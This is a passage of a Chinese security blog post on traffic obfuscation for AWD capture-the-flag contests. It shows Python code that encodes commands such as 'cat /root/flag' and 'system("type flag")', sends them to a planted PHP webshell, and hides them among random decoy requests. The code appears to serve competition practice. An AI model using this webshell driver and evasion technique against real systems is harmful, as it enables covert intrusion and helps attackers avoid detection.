class="number">2</span>:</span><br><span class="line">            url = host + <span class="string">"/"</span> + page</span><br><span class="line">            header = &#123;</span><br><span class="line">                <span class="string">"cookie"</span>:variable+<span class="string">"="</span>+payload</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url,headers=header,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#print("ERROR COOKIE")</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">confusion</span><span class="params">(self,host)</span>:</span><span class="comment">#调用混淆模块,这里采用随机的方式，不发送全部流量</span></span><br><span class="line">        pagecount = []</span><br><span class="line">        num = random.randint(<span class="number">3</span>, <span class="number">10</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> pagenum <span class="keyword">in</span> range(num):</span><br><span class="line">            page = self.php_path[random.randint(<span class="number">0</span>, len(self.php_path) - <span class="number">1</span>)]</span><br><span class="line">            page = page.replace(self.path + <span class="string">"\\"</span>, <span class="string">""</span>).replace(<span class="string">"\\"</span>, <span class="string">"/"</span>)</span><br><span class="line">            <span class="keyword">if</span> page <span class="keyword">not</span> <span class="keyword">in</span> pagecount:<span class="comment">#仅向未发送过的页面发送数据</span></span><br><span class="line">                pagecount.append(page)</span><br><span class="line">                req = random.randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">                payload = encode.confusion_payload()</span><br><span class="line">                variable = self.request_list[random.randint(<span class="number">0</span>, len(self.request_list) - <span class="number">1</span>)]</span><br><span class="line">                self.request_confusion(host=host, req=req, page=page, variable=variable, payload=payload)</span><br></pre></td></tr></table></figure>
+<p><strong>encode.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s, OffSet=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f=<span class="keyword">lambda</span> x: chr((ord(ch)-x+OffSet) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">listhtml = [<span class="string">"&lt;p&gt;"</span>,<span class="string">"&lt;body&gt;"</span>,<span class="string">"&lt;head&gt;"</span>,<span class="string">"&lt;a&gt;"</span>,<span class="string">"&lt;span&gt;"</span>,<span class="string">"&lt;br&gt;"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tags</span><span class="params">(str)</span>:</span></span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        i+=listhtml[random.randint(<span class="number">0</span>,len(listhtml)<span class="number">-1</span>)]</span><br><span class="line">        string+=i</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tags(rot13((str)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"cat /root/flag"</span></span><br><span class="line"></span><br><span class="line">print(encode(payload))  <span class="comment">#测试输出真正的编码后的payload</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">strip_tags()</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confusion_payload</span><span class="params">()</span>:</span><span class="comment">#混淆payload函数</span></span><br><span class="line">    random_char = <span class="string">"abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmpopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    random_strings = <span class="string">""</span>.join(random.sample(random_char, random.randint(<span class="number">1</span>, <span class="number">186</span>)))  <span class="comment"># 此处最大值，根据字符串长度</span></span><br><span class="line">    <span class="keyword">return</span> encode(random_strings)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(100): #测试输出混淆payload部分</span></span><br><span class="line"><span class="comment">#     print(confusion_payload())</span></span><br></pre></td></tr></table></figure>
+<p><strong>attack.py</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> encode</span><br><span class="line"><span class="keyword">import</span> confusion</span><br><span class="line"></span><br><span class="line">conf = confusion.confusion(<span class="string">"F:\\phpStudy\\PHPTutorial\\WWW\\awd"</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10.232.54.176/awd/conn.php"</span></span><br><span class="line">payload = <span class="string">'system("type flag")'</span></span><br><span class="line">payload_encode = encode.encode(payload)</span><br><span class="line"><span class="comment">#print(payload_encode)</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"Arra"</span>:payload_encode,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conf.confusion(<span class="string">"10.232.54.176/awd"</span>)</span><br><span class="line">html = requests.post(url,data=data).text</span><br><span class="line">conf.confusion(<span class="string">"10.232.54.176/awd"</span>)</span><br><span class="line">print(html)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(encode.encode("system('ipconfig');"))</span></span><br></pre></td></tr></table></figure>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/AWD/">AWD</a><a href="/tags/流量混淆/">流量混淆</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2018/09/15/AWD流量混淆/" data-title="AWD流量混淆 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/08/30/ISG2018-Web-Writeup/"  title="ISG 2018 Web Writeup">
+ <strong>下一篇：</strong><br/> 
+ <span>ISG 2018 Web Writeup
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-混淆原理"><span class="toc-number">1.</span> <span class="toc-text">0x01 混淆原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-编码与解码"><span class="toc-number">2.</span> <span class="toc-text">0x02 编码与解码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-流量混淆"><span class="toc-number">3.</span> <span class="toc-text">0x03 流量混淆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-混淆马"><span class="toc-number">4.</span> <span class="toc-text">0x04 混淆马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-完整代码"><span class="toc-number">5.</span> <span class="toc-text">0x05 完整代码</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>8</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/流量混淆/" title="流量混淆">流量混淆<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/图像识别/" title="图像识别">图像识别<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/xman/" title="xman">xman<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://p0desta.top" target="_blank" title="p0desta">p0desta</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="www.jzns.club" target="_blank" title="鸡汁安全">鸡汁安全</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
